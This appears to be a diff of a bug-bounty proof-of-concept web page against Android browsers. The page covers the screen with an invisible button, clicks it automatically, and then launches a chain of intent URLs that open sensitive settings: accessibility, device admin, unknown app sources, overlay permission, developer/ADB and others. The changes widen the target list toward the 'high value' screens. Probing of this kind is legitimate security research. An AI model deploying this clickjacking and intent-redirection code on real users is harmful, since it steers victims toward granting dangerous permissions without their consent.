@@ -1,32 +1,68 @@
 <!DOCTYPE html>
 <html>
 <body style="margin: 0; padding: 0;">
-  <!-- Full-screen invisible button -->
   <button onclick="triggerExploit()" 
           style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0.01; cursor: default;">
-    Invisible trigger
   </button>
   
   <script>
     function triggerExploit() {
-      // Try multiple targets
+      // Try these more sensitive targets
       var targets = [
-        'intent:#Intent;action=android.settings.SETTINGS;end',
-        'intent:#Intent;action=android.settings.WIFI_SETTINGS;end',
-        'intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end',
-        'intent:#Intent;action=android.settings.AIRPLANE_MODE_SETTINGS;end',
-        'intent:#Intent;action=android.settings.DEVICE_INFO_SETTINGS;end'
+        // Already confirmed working for you
+        'intent:#Intent;action=android.settings.DEVICE_INFO_SETTINGS;end',
+        
+        // System settings that might work
+        'intent:#Intent;action=android.settings.APPLICATION_SETTINGS;end',
+        'intent:#Intent;action=android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS;end',
+        'intent:#Intent;action=android.settings.APP_NOTIFICATION_SETTINGS;end',
+        
+        // Security related (high value for bugs)
+        'intent:#Intent;action=android.settings.SECURITY_SETTINGS;end',
+        'intent:#Intent;action=android.settings.PRIVACY_SETTINGS;end',
+        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+        
+        // Development/ADB settings
+        'intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end',
+        'intent:#Intent;action=android.settings.DEVELOPMENT_SETTINGS;end',
+        
+        // Accessibility (critical for P1 bugs)
+        'intent:#Intent;action=android.settings.ACCESSIBILITY_SETTINGS;end',
+        
+        // Install unknown apps (very sensitive)
+        'intent:#Intent;action=android.settings.MANAGE_UNKNOWN_APP_SOURCES;end',
+        'intent:#Intent;action=android.settings.MANAGE_OVERLAY_PERMISSION;end',
+        
+        // Notification access
+        'intent:#Intent;action=android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;end',
+        
+        // Usage access
+        'intent:#Intent;action=android.settings.USAGE_ACCESS_SETTINGS;end',
+        
+        // Device admin
+        'intent:#Intent;action=android.settings.ACTION_ADD_DEVICE_ADMIN;end',
+        
+        // Dreamy bonus - try if package name works
+        'intent:#Intent;package=com.android.settings;action=android.intent.action.MAIN;end',
+        
+        // Component targeting (may bypass restrictions)
+        'intent:#Intent;component=com.android.settings/.Settings;end',
+        'intent:#Intent;component=com.android.settings/.Settings$SecuritySettingsActivity;end',
+        'intent:#Intent;component=com.android.settings/.Settings$AccessibilitySettingsActivity;end',
+        
+        // Special intents with extras
+        'intent:#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;S.android.provider.extra.APP_PACKAGE=com.android.chrome;end',
       ];
       
       // Try each one
       targets.forEach((target, index) => {
         setTimeout(() => {
+          console.log('Trying:', target);
           window.location = target;
-        }, index * 100);
+        }, index * 200);
       });
     }
     
-    // Auto-click after short delay
     setTimeout(() => {
       document.querySelector('button').click();
     }, 500);
